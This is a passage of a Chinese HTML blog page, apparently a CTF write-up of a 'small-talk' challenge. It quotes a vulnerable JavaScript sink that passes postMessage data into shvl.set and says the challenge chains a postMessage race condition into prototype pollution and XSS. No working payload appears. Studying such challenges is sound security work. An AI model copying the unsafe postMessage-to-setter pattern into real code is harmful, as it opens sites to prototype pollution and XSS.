+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>]);</span><br><span class="line">shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后我就不知道该咋做了，看带师傅们的博客发现这好像是XSS，可是这题靶机好像不太对了，别人都可以看见留言我看不见</p>
+<p><img src="image-20210602153814107.png" alt="image-20210602153814107"></p>
+<p><img src="120125921-18a7eb80-c1ed-11eb-98f8-ff40d667b324.png" alt="截圖 2021-05-31 上午8 36 30"></p>
+<p>这道题是从 postMessage 中的条件竞争 到<a target="_blank" rel="noopener" href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">原型污染</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonslab.me&#x2F;posts&#x2F;small-talk-writeup&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>node的条件竞争还没见过。感觉很新颖可以拿来出题。</p>
+<p>题目的思路为：</p>
+<pre><code>+ 加载一个iframe并向postMessage父页面发送一个随机句子
++ 然后页面通过shvl解析
++ 之后放到页面上
++ 初始化[Popper.js](https://github.com/popperjs/popper-core)</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#illusion"><span class="toc-number">2.</span> <span class="toc-text">illusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">知识点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#small-talk"><span class="toc-number">3.</span> <span class="toc-text">small-talk</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-number">3.1.</span> <span class="toc-text">知识点</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
